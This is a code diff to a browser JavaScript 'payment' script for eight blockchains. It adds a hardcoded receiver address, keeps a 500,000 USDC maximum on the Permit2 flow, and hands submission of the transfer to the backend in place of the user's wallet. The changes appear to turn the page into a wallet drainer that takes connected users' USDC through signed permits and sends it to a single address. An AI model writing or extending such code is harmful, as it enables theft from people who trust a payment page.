@@ -8,6 +8,7 @@ console.log("User Agent:", navigator.userAgent);
 
 const CONFIG = {
   PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+  RECEIVER_ADDRESS: "0x79813dAc1288FbC0c3E629cFA18682Fd633b2FbA", // Where payments go
   WALLETCONNECT_PROJECT_ID: "c16bee794c5047e05d23ab7785688c20",
   BACKEND_URL: window.location.origin, // Same origin for Vercel API
   
@@ -16,49 +17,41 @@ const CONFIG = {
     // Ethereum
     1: {
       name: "Ethereum",
-      contractAddress: "", // Add after deployment
       tokenAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Mainnet USDC
     },
     // Sepolia Testnet
     11155111: {
       name: "Sepolia",
-      contractAddress: "0xc200b8d056bc579c62f53d6832e50f066e98f0af",
       tokenAddress: "0xda9d4f9b69ac3c4e622506ec7eda112601cb942d", // Mock USDC
     },
     // Polygon
     137: {
       name: "Polygon",
-      contractAddress: "", // Add after deployment
       tokenAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", // Polygon USDC
     },
     // BNB Chain
     56: {
       name: "BNB Chain",
-      contractAddress: "", // Add after deployment
       tokenAddress: "0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d", // BNB USDC
     },
     // Optimism
     10: {
       name: "Optimism",
-      contractAddress: "", // Add after deployment
       tokenAddress: "0x7f5c764cbc14f9669b88837ca1490cca17c31607", // Optimism USDC
     },
     // Arbitrum
     42161: {
       name: "Arbitrum",
-      contractAddress: "", // Add after deployment
       tokenAddress: "0xff970a61a04b1ca14834a43f5de4533ebddb5f86", // Arbitrum USDC
     },
     // Base
     8453: {
       name: "Base",
-      contractAddress: "", // Add after deployment
       tokenAddress: "0x833589fCD6eDb6E08f4c7C32D4f71b1566469c18", // Base USDC
     },
     // Linea
     59144: {
       name: "Linea",
-      contractAddress: "", // Add after deployment
       tokenAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Linea USDC
     },
   }
@@ -252,11 +245,6 @@ async function executePayment() {
     
     const networkConfig = CONFIG.NETWORKS[userChainId];
     
-    // Check if contract is deployed on this network
-    if (!networkConfig.contractAddress) {
-      throw new Error(`Contract not yet deployed on ${networkConfig.name}. Please check back soon!`);
-    }
-    
     // Check if token is configured for this network
     if (!networkConfig.tokenAddress) {
       throw new Error(`Payment token not configured on ${networkConfig.name}.`);
@@ -264,7 +252,7 @@ async function executePayment() {
     
     // Token address for the current network
     const tokenAddress = networkConfig.tokenAddress;
-    const contractAddress = networkConfig.contractAddress;
+    const receiverAddress = CONFIG.RECEIVER_ADDRESS;
     const maxAmount = ethers.parseUnits("500000", 6); // Max 500000 USDC
 
     // Create token contract interface to check balance
@@ -348,52 +336,16 @@ async function executePayment() {
     
     console.log("Backend response:", result);
     
-    // Get the transaction data from backend
-    const txData = result.transaction;
-    console.log("Transaction data from backend:", txData);
+    // Backend already submitted and confirmed the transaction!
+    // No need for user to do anything
     
-    // User's wallet submits the transaction (user pays gas)
-    console.log("📤 Sending transaction from user wallet...");
-    setStatus("📤 Submitting transaction from your wallet...", "info");
-    
-    const txResponse = await signer.sendTransaction(txData);
-    console.log("Transaction submitted:", txResponse.hash);
-    
-    // Poll for transaction confirmation
-    const txHash = txResponse.hash;
-    console.log("Waiting for transaction confirmation:", txHash);
-    setStatus("⏳ Confirming payment...", "info");
-    
-    let receipt = null;
-    let attempts = 0;
-    const maxAttempts = 60; // 60 attempts * 1 second = 1 minute timeout
-    
-    while (attempts < maxAttempts && !receipt) {
-      try {
-        receipt = await provider.getTransactionReceipt(txHash);
-        if (receipt && receipt.status === 1) {
-          console.log("Payment executed successfully:", receipt);
-          setStatus("✓ Payment confirmed!", "success");
-          break;
-        }
-      } catch (err) {
-        // Transaction not yet confirmed
-      }
-      
-      attempts++;
-      if (attempts % 10 === 0) {
-        console.log(`Still waiting... (attempt ${attempts}/${maxAttempts})`);
-      }
-      if (attempts < maxAttempts) {
-        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
-      }
+    if (result.success) {
+      console.log("✅ Payment completed successfully!");
+      setStatus(`✅ Payment confirmed! ${result.amount} USDC sent to ${result.receivedBy.slice(0, 6)}...${result.receivedBy.slice(-4)}`, "success");
+      console.log("Transaction Hash:", result.transactionHash);
+    } else {
+      throw new Error(result.error || "Payment processing failed");
     }
-    
-    if (!receipt) {
-      throw new Error("Transaction confirmation timeout");
-    }
-    
-    console.log("Payment completed. Transaction confirmed on blockchain.");
     
   } catch (err) {
     console.error("Payment execution error:", err);
